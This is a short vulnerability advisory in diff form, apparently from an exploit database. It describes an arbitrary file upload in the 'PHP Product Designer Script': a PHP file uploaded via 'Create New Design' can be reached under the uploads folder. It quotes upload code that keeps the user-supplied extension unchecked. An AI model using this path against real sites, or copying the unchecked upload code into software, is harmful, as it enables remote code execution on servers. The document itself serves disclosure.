@@ -1,0 +1,35 @@
+# # # # # 
+# Exploit Title: PHP Product Designer Script - Arbitrary File Upload
+# Google Dork: N/A
+# Date: 30.01.2017
+# Vendor Homepage: https://codecanyon.net/item/php-product-designer/19334412
+# Software Buy: https://codecanyon.net/item/php-product-designer/19334412
+# Demo: http://phpproductdesigner.000webhostapp.com/products.php
+# Version: N/A
+# Tested on: Win7 x64, Kali Linux x64
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Mail : ihsan[beygir]ihsan[nokta]net
+# # # # #
+# Exploit :
+# http://localhost/[PATH]/products.php / Create New Design
+# http://localhost/[PATH]/theme/images/uploads/[......PHP]
+# # # # #
+# uploadImage.php
+<?php
+$output_dir = "./theme/images/uploads/";
+.
+.
+.
+$imagetemp = explode(".", $_FILES["imagefile"]["name"]);
+		$newimagename = round(microtime(true)) . '.' . end($imagetemp);
+		//move the uploaded file to uploads folder;
+    	move_uploaded_file($_FILES["imagefile"]["tmp_name"],$output_dir. $newimagename);
+    
+   	 echo $output_dir . $newimagename;
+	}
+
+}
+?>
+# # # # #
